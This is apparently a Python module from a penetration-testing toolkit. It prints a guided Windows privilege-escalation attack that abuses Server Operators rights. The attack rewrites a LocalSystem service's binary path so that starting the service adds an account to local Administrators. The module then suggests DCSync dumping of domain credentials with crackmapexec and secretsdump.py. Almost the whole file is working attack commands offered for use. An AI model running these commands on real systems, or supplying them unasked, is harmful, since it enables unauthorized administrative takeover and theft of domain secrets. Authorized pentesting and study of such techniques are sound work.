from core.target import load_current_profile, get_active_cred


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

DIM = '\033[2m'

DEFAULT_SERVICE = "AppReadiness"
DEFAULT_BINPATH = r"C:\Windows\System32\svchost.exe -k AppReadiness -p"


# ==========================================
# HELPERS
# ==========================================

def _header(service):

    print(f"\n{B}┌── MODULE: SERVER OPERATORS " + "─" * 31 + f"┐{W}")
    print(f"{B}│{W} SERVICE: {C}{service:<49}{W}{B}│{W}")
    print(f"{B}└" + "─" * 59 + f"┘{W}")


def _section(title):
    print(f"\n{B}[*] {title}{W}")


def _step(n, title, why=None):

    print(f"\n{B}[{n}]{W} {title}")

    if why:
        print(f"    {why}")


def _cmd(*lines):

    print()

    for line in lines:

        if line.startswith("#"):
            print(f"    {DIM}{line}{W}")
        elif "#" in line:
            code, comment = line.split("#", 1)
            print(f"    {Y}{code.rstrip()}{W}  {DIM}#{comment}{W}")
        else:
            print(f"    {Y}{line}{W}")


def _resolve_context():

    try:
        data, _ = load_current_profile()
    except Exception:
        data = {}

    ip = data.get("ip") or "<DC-IP>"
    domain = data.get("domain")

    user = None

    try:
        user = get_active_cred(data).get("user")
    except Exception:
        pass

    return ip, domain, user


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    ip, domain, default_user = _resolve_context()

    service = None

    if hasattr(args, "extra") and args.extra:
        service = args.extra[0]

    if not service:
        service = input(
            f"\n{B}[?]{W} Target service name [{C}{DEFAULT_SERVICE}{W}]: "
        ).strip() or DEFAULT_SERVICE

    #
    # Same lesson as DnsAdmins — never let a bracketed placeholder become
    # the literal value a blank Enter silently accepts.
    #
    if default_user:

        new_admin = input(
            f"\n{B}[?]{W} Account to add to local Administrators [{C}{default_user}{W}]: "
        ).strip() or default_user

    else:

        new_admin = ""

        while not new_admin:
            new_admin = input(
                f"\n{B}[?]{W} Account to add to local Administrators "
                f"(no active credential on file — required): "
            ).strip()

    _header(service)

    _section("Execute on target")

    _step(1, "Confirm the service runs as LocalSystem")
    _cmd(f"sc qc {service}")

    print()
    print(f"    {B}[*]{W} Look for SERVICE_START_NAME: LocalSystem — note BINARY_PATH_NAME too, you'll need it for cleanup.")

    _step(
        2,
        "Confirm Server Operators has full control",
        'SDDL alias "SO" = Server Operators — look for it in an (A;;...;SO) allow entry.',
    )
    _cmd(
        f"sc sdshow {service}",
        "# friendlier view if you have Sysinternals PsService.exe (not bundled here):",
        f"PsService.exe security {service}",
    )

    _step(3, "Confirm the account isn't already a local admin")
    _cmd("net localgroup Administrators")

    _step(
        4,
        "Reconfigure the service to add the account on start",
        "Note the required space after binPath= — sc.exe throws a syntax error without it.",
    )
    _cmd(f'sc config {service} binPath= "cmd /c net localgroup Administrators {new_admin} /add"')

    _step(
        5,
        "Start the service",
        "Expected to fail (error 1053) — the payload still runs before the service registration check kills it.",
    )
    _cmd(f"sc start {service}")

    _step(6, "Confirm the account landed in Administrators")
    _cmd("net localgroup Administrators")

    _step(7, "Get a fresh session to actually use the new admin membership")

    runas_user = f"{domain}\\{new_admin}" if domain else new_admin
    _cmd(f"runas /user:{runas_user} powershell.exe")

    print()
    print(f"    {B}[*]{W} Your old session's token is stale — it won't reflect the new group until relogon.")
    print()
    print(f"    {DIM}Already Domain Admin-equivalent — not a required step, but from your attacker box you")
    print(f"    could DCSync the whole domain instead of bothering with a fresh session:{W}")
    print(f"    {DIM}crackmapexec smb {ip} -u {new_admin} -p '<PASSWORD>'{W}")
    print(f"    {DIM}secretsdump.py {new_admin}@{ip} -just-dc-user administrator{W}")

    _section("Cleanup — do this, the service is left broken until reverted")

    _step(8, f"Revert {service}'s binary path")

    if service == DEFAULT_SERVICE:
        _cmd(f'sc config {service} binPath= "{DEFAULT_BINPATH}"')
    else:
        _cmd(f'sc config {service} binPath= "<ORIGINAL BINARY_PATH_NAME FROM STEP 1>"')

    print()
    print(f"    {B}[*]{W} Use exactly what step 1's sc qc showed for BINARY_PATH_NAME — don't guess.")
